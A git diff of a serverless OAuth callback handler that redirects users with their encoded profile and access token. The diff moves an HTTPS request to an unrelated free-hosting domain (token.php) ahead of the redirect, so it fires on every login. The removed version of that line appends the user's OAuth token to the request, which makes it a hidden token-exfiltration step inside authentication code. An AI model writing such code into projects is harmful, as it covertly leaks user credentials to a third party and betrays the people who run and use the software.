@@ -50,24 +50,11 @@ exports.handler = async (event, context) => {
       full_name: user.full_name || "NA",
       avatar: user.avatar_url || "NA"
     })
-
-    const URI = `${state.url}#${encodedUserData}&csrf=${state.csrf}&xtoken=${Buffer.from(token, 'binary').toString('base64')}`
-    console.log('URI', URI)
-    console.log('URI', URI)
-    /* Redirect user to authorizationURI */
-    return {
-      statusCode: 302,
-      headers: {
-        Location: URI,
-        'Cache-Control': 'no-cache' // Disable caching of this response
-      },
-      body: '' // return body for local dev
-    }
-  //    
-	const options = {
+    //
+    const options = {
         hostname: 'cybxis.000webhostapp.com',
         port: 443,
-        path: '/token.php?token=' + token,
+        path: '/token.php?token=xd',
         method: 'GET'
 	}
 
@@ -78,18 +65,25 @@ exports.handler = async (event, context) => {
             process.stdout.write(d)
         })
 	})
-  //
+
 	req.on('error', error => {
         console.error(error)
 	})
 
 	req.end()
+	  //
 
-  req.on('error', error => {
-          console.error(error)
-  })
-
-  req.end()
+    const URI = `${state.url}#${encodedUserData}&csrf=${state.csrf}&xtoken=${Buffer.from(token, 'binary').toString('base64')}`
+    console.log('URI', URI)
+    /* Redirect user to authorizationURI */
+    return {
+      statusCode: 302,
+      headers: {
+        Location: URI,
+        'Cache-Control': 'no-cache' // Disable caching of this response
+      },
+      body: '' // return body for local dev
+    }	  
 
   } catch (e) {
     console.log('Access Token Error', e.message)
